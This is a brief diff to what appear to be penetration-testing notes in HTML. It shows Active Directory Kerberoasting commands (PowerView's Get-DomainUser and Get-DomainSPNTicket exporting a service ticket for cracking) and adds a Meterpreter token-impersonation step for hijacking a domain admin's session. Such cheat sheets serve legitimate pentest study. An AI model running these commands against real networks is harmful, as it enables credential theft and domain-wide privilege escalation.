@@ -99,4 +99,6 @@ Look on printers <br>
  Import-Module .\PowerView.ps1 <br>
 Get-DomainUser * -spn | select samaccountname <br>
   Now target account - Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
-
+<br>
+  <h1>Token Impersonation</h1><br>
+  meterpreter - impersonate_token (use on machine a DA has a session) <br>
